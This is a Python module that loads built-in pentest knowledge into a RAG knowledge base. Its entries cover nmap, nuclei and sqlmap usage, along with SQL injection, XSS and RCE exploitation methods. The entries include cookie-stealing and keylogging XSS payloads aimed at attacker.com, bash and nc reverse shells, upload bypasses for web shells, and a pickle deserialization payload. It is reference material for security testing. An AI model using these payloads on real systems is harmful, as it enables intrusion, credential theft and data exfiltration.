# -*- coding: utf-8 -*-
"""
知识数据加载器
从多种数据源加载安全知识到 RAG 系统
"""

import os
import json
import logging
from typing import List, Dict, Any, Optional
from pathlib import Path
from dataclasses import dataclass, field
from datetime import datetime

from .qdrant_client import KnowledgeDocument, get_rag_client

logger = logging.getLogger(__name__)


@dataclass
class KnowledgeSource:
    """知识来源配置"""
    name: str
    type: str  # "file", "directory", "api", "builtin"
    path: Optional[str] = None
    url: Optional[str] = None
    category: str = "general"
    enabled: bool = True


class KnowledgeLoader:
    """
    知识数据加载器

    从多种数据源加载安全知识：
    - 内置知识（工具指南、漏洞利用方法）
    - 文件（JSON、Markdown、TXT）
    - 目录（批量导入）
    """

    def __init__(self, data_dir: Optional[str] = None):
        """
        初始化加载器

        Args:
            data_dir: 知识数据目录
        """
        self.data_dir = data_dir or os.path.join(
            os.path.dirname(__file__),
            "..", "..", "..", "..", "..",
            "data", "knowledge"
        )
        self._builtin_knowledge = self._get_builtin_knowledge()

    def _get_builtin_knowledge(self) -> List[KnowledgeDocument]:
        """获取内置知识库"""
        return [
            # ==================== 工具使用指南 ====================
            KnowledgeDocument(
                id="tool_nmap_001",
                title="Nmap 端口扫描指南",
                content="""
# Nmap 端口扫描使用指南

## 基本用法
nmap -sV -sC target.com   # 版本检测 + 默认脚本
nmap -p- target.com       # 扫描所有端口
nmap -A target.com        # 全面扫描（OS检测、版本、脚本、路由追踪）

## 常用参数
- `-sS`: TCP SYN 扫描（默认，需要 root）
- `-sT`: TCP 连接扫描
- `-sU`: UDP 扫描
- `-sV`: 版本检测
- `-sC`: 使用默认脚本
- `-O`: 操作系统检测
- `-p-`: 扫描所有 65535 端口
- `-p 22,80,443`: 指定端口
- `--script vuln`: 运行漏洞检测脚本

## 输出格式
- `-oN output.txt`: 普通格式
- `-oX output.xml`: XML 格式
- `-oG output.gnmap`: Grepable 格式

## 最佳实践
1. 先快速扫描常用端口：nmap -F target
2. 再详细扫描发现的开放端口
3. 使用 -sV 获取服务版本信息
4. 根据服务版本选择后续攻击向量
""",
                category="tool_guide",
                tags=["nmap", "扫描", "端口", "信息收集"],
                source="builtin",
                metadata={"tool": "nmap", "priority": "P0"}
            ),
            KnowledgeDocument(
                id="tool_nuclei_001",
                title="Nuclei 漏洞扫描指南",
                content="""
# Nuclei 漏洞扫描使用指南

## 基本用法
nuclei -u https://target.com -t cves/   # 扫描 CVE 模板
nuclei -l urls.txt -t vulnerabilities/  # 批量扫描
nuclei -u target.com -severity critical,high  # 只扫描高危漏洞

## 模板分类
- `cves/`: CVE 漏洞模板
- `vulnerabilities/`: 通用漏洞
- `exposures/`: 敏感信息暴露
- `technologies/`: 技术栈识别
- `misconfiguration/`: 配置错误

## 常用参数
- `-t templates/`: 指定模板目录
- `-severity low,medium,high,critical`: 按严重性过滤
- `-tags tag1,tag2`: 按标签过滤
- `-rate-limit 150`: 速率限制
- `-c 50`: 并发数

## 自定义模板
```yaml
id: my-custom-check
info:
  name: Custom Security Check
  severity: high
requests:
  - method: GET
    path:
      - "{{BaseURL}}/admin"
    matchers:
      - type: status
        status:
          - 200
```

## 最佳实践
1. 先用 -tl 列出可用模板
2. 根据目标技术栈选择合适模板
3. 使用 -severity 过滤重要漏洞
4. 定期更新模板：nuclei -update-templates
""",
                category="tool_guide",
                tags=["nuclei", "漏洞扫描", "CVE", "模板"],
                source="builtin",
                metadata={"tool": "nuclei", "priority": "P0"}
            ),
            KnowledgeDocument(
                id="tool_sqlmap_001",
                title="SQLMap SQL注入检测指南",
                content="""
# SQLMap SQL 注入检测使用指南

## 基本用法
sqlmap -u "http://target.com?id=1"           # 基本检测
sqlmap -u "http://target.com?id=1" --dbs     # 列出数据库
sqlmap -u "http://target.com?id=1" -D db -T users --dump  # 导出数据

## 注入技术
- `--technique=BEUSTQ`: 指定注入技术
  - B: Boolean-based blind
  - E: Error-based
  - U: Union query-based
  - S: Stacked queries
  - T: Time-based blind
  - Q: Inline queries

## 常用参数
- `--level=1-5`: 检测级别（越高越详细）
- `--risk=1-3`: 风险级别（越高越可能触发检测）
- `--batch`: 自动回答所有问题
- `--random-agent`: 使用随机 User-Agent
- `--tamper`: 使用混淆脚本
- `--threads=10`: 多线程

## POST 注入
sqlmap -u "http://target.com/login" --data="user=admin&pass=123"
sqlmap -u "http://target.com/api" --data='{"id":1}' --headers="Content-Type: application/json"

## 绕过 WAF
sqlmap -u "target.com?id=1" --tamper=space2comment,between
sqlmap -u "target.com?id=1" --random-agent --delay=2

## 最佳实践
1. 先用 --batch --level=1 快速检测
2. 确认注入点后提高 level
3. 使用 --tamper 绕过 WAF
4. 导出数据时注意目标大小
""",
                category="tool_guide",
                tags=["sqlmap", "SQL注入", "数据库", "渗透"],
                source="builtin",
                metadata={"tool": "sqlmap", "priority": "P1"}
            ),

            # ==================== 漏洞利用方法 ====================
            KnowledgeDocument(
                id="exploit_sqli_001",
                title="SQL注入漏洞利用方法",
                content="""
# SQL 注入漏洞利用方法

## 检测方法
1. 单引号测试：`'` → 报错可能存在注入
2. 布尔测试：`1' AND '1'='1` / `1' AND '1'='2`
3. 时间测试：`1' AND SLEEP(5)--`

## 利用技术

### Union 注入
```
' UNION SELECT 1,2,3--
' UNION SELECT username,password,3 FROM users--
```

### Boolean 盲注
```
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

### Time 盲注
```
' AND IF((SELECT SUBSTRING(password,1,1) FROM users)='a',SLEEP(5),0)--
```

### 报错注入
```
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))--
```

## 绕过技巧
- 大小写混合：`SeLeCt`
- 编码：URL编码、Hex编码
- 注释：`/**/`、`/*!*/`
- 空白符：%09、%0A、%0D

## 防御建议
1. 使用参数化查询
2. 输入验证和过滤
3. 最小权限原则
4. WAF 防护
""",
                category="exploit_method",
                tags=["SQL注入", "漏洞利用", "数据库"],
                source="builtin",
                metadata={"vuln_type": "sqli", "severity": "critical"}
            ),
            KnowledgeDocument(
                id="exploit_xss_001",
                title="XSS跨站脚本攻击利用方法",
                content="""
# XSS 跨站脚本攻击利用方法

## 类型
1. **反射型 XSS**: URL 参数直接输出到页面
2. **存储型 XSS**: 恶意脚本存储在服务器
3. **DOM型 XSS**: 客户端 JavaScript 动态渲染

## 常用 Payload

### 基础测试
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

### 绕过过滤
```html
<ScRiPt>alert('XSS')</sCrIpT>
<img src=x onerror="&#97;lert('XSS')">
<svg/onload=alert('XSS')>
<body onload=alert('XSS')>
```

### 高级利用
```html
<script>
// 窃取 Cookie
new Image().src="http://attacker.com/?c="+document.cookie

// 键盘记录
document.onkeypress=function(e){
  new Image().src="http://attacker.com/?k="+e.key
}
</script>
```

## 防御建议
1. 输出编码（HTML Entity）
2. Content-Security-Policy (CSP)
3. HttpOnly Cookie
4. 输入过滤（不推荐作为主要防御）
""",
                category="exploit_method",
                tags=["XSS", "跨站脚本", "前端安全"],
                source="builtin",
                metadata={"vuln_type": "xss", "severity": "high"}
            ),
            KnowledgeDocument(
                id="exploit_rce_001",
                title="远程代码执行(RCE)利用方法",
                content="""
# 远程代码执行 (RCE) 利用方法

## 常见入口

### 命令注入
```bash
# 检测
; id
| id
`id`
$(id)

# 反弹 Shell
; bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
| nc attacker 4444 -e /bin/bash
```

### 文件上传
1. 上传 Web Shell：`shell.php`、`shell.jsp`
2. 绕过扩展名检查：`shell.php.jpg`、`shell.php%00.jpg`
3. 绕过 MIME 检查：修改 Content-Type

### 反序列化漏洞
```python
# Python pickle
import pickle
import os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
payload = pickle.dumps(Exploit())
```

### SSRF 转化为 RCE
- 云环境：访问元数据服务
- 内网服务：攻击内部应用

## 防御建议
1. 输入验证和白名单
2. 禁用危险函数
3. 使用安全反序列化
4. 沙箱隔离
""",
                category="exploit_method",
                tags=["RCE", "命令注入", "文件上传", "反序列化"],
                source="builtin",
                metadata={"vuln_type": "rce", "severity": "critical"}
            ),

            # ==================== 渗透测试技巧 ====================
            KnowledgeDocument(
                id="technique_recon_001",
                title="信息收集方法论",
                content="""
# 信息收集方法论

## 被动信息收集
1. **域名信息**
   - whois 查询
   - DNS 记录枚举
   - 子域名发现（subfinder, sublist3r）

2. **搜索引擎**
   - Google Dorking
   - Shodan 搜索
   - Fofa 搜索

3. **证书透明度**
   - crt.sh
   - censys

## 主动信息收集
1. **端口扫描**
   ```bash
   nmap -sS -sV -p- target.com
   masscan -p1-65535 target.com --rate=1000
   ```

2. **服务识别**
   ```bash
   whatweb target.com
   nuclei -u target.com -t technologies/
   ```

3. **目录扫描**
   ```bash
   dirsearch -u target.com
   ffuf -u target.com/FUZZ -w wordlist.txt
   ```

## 信息整理
- 开放端口和服务版本
- 技术栈（框架、CMS、语言）
- 子域名和 IP
- 敏感目录和文件
- 用户名和邮箱格式

## 最佳实践
1. 先被动后主动
2. 不要遗漏任何信息
3. 详细记录每一步
4. 自动化 + 人工验证
""",
                category="technique",
                tags=["信息收集", "侦察", "渗透测试"],
                source="builtin",
                metadata={"phase": "recon"}
            ),
        ]

    def load_builtin_knowledge(self) -> List[KnowledgeDocument]:
        """加载内置知识"""
        logger.info(f"加载内置知识: {len(self._builtin_knowledge)} 条")
        return self._builtin_knowledge

    def load_from_json(self, file_path: str) -> List[KnowledgeDocument]:
        """
        从 JSON 文件加载知识

        Args:
            file_path: JSON 文件路径

        Returns:
            文档列表
        """
        documents = []

        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                data = json.load(f)

            # 支持多种格式
            if isinstance(data, list):
                for i, item in enumerate(data):
                    documents.append(self._parse_json_item(item, i))
            elif isinstance(data, dict):
                if "documents" in data:
                    for i, item in enumerate(data["documents"]):
                        documents.append(self._parse_json_item(item, i))
                else:
                    documents.append(self._parse_json_item(data, 0))

            logger.info(f"从 {file_path} 加载 {len(documents)} 条知识")

        except Exception as e:
            logger.error(f"加载 JSON 文件失败 {file_path}: {e}")

        return documents

    def _parse_json_item(self, item: Dict[str, Any], index: int) -> KnowledgeDocument:
        """解析 JSON 项为文档"""
        return KnowledgeDocument(
            id=item.get("id", f"json_{index}"),
            title=item.get("title", f"Document {index}"),
            content=item.get("content", ""),
            category=item.get("category", "general"),
            tags=item.get("tags", []),
            source=item.get("source", "json_file"),
            metadata=item.get("metadata", {})
        )

    def load_from_directory(
        self,
        dir_path: str,
        category: str = "general"
    ) -> List[KnowledgeDocument]:
        """
        从目录加载知识（支持 .md, .txt, .json）

        Args:
            dir_path: 目录路径
            category: 默认类别

        Returns:
            文档列表
        """
        documents = []
        dir_path = Path(dir_path)

        if not dir_path.exists():
            logger.warning(f"目录不存在: {dir_path}")
            return documents

        for file_path in dir_path.rglob("*"):
            if file_path.is_file():
                suffix = file_path.suffix.lower()

                if suffix == ".json":
                    documents.extend(self.load_from_json(str(file_path)))

                elif suffix in [".md", ".txt"]:
                    try:
                        with open(file_path, 'r', encoding='utf-8') as f:
                            content = f.read()

                        documents.append(KnowledgeDocument(
                            id=f"file_{file_path.stem}",
                            title=file_path.stem,
                            content=content,
                            category=category,
                            tags=[suffix[1:]],  # md 或 txt
                            source=str(file_path)
                        ))

                    except Exception as e:
                        logger.error(f"读取文件失败 {file_path}: {e}")

        logger.info(f"从目录 {dir_path} 加载 {len(documents)} 条知识")
        return documents

    async def initialize_knowledge_base(
        self,
        include_builtin: bool = True,
        custom_sources: Optional[List[KnowledgeSource]] = None,
        recreate: bool = False
    ) -> Dict[str, int]:
        """
        初始化知识库

        Args:
            include_builtin: 是否包含内置知识
            custom_sources: 自定义数据源
            recreate: 是否重建集合

        Returns:
            各来源的索引数量
        """
        rag_client = get_rag_client()
        if rag_client is None:
            logger.error("RAG 客户端不可用")
            return {}

        # 初始化集合
        await rag_client.initialize_collection(recreate=recreate)

        results = {}

        # 加载内置知识
        if include_builtin:
            builtin_docs = self.load_builtin_knowledge()
            count = await rag_client.index_documents(builtin_docs)
            results["builtin"] = count

        # 加载自定义数据源
        if custom_sources:
            for source in custom_sources:
                if not source.enabled:
                    continue

                docs = []
                if source.type == "file":
                    docs = self.load_from_json(source.path)
                elif source.type == "directory":
                    docs = self.load_from_directory(source.path, source.category)

                if docs:
                    count = await rag_client.index_documents(docs)
                    results[source.name] = count

        return results


# 全局实例
_loader: Optional[KnowledgeLoader] = None


def get_knowledge_loader() -> KnowledgeLoader:
    """获取全局知识加载器实例"""
    global _loader
    if _loader is None:
        _loader = KnowledgeLoader()
    return _loader


async def initialize_knowledge_base(
    include_builtin: bool = True,
    recreate: bool = False
) -> Dict[str, int]:
    """
    初始化知识库的快捷方法

    Args:
        include_builtin: 是否包含内置知识
        recreate: 是否重建集合

    Returns:
        各来源的索引数量
    """
    loader = get_knowledge_loader()
    return await loader.initialize_knowledge_base(
        include_builtin=include_builtin,
        recreate=recreate
    )
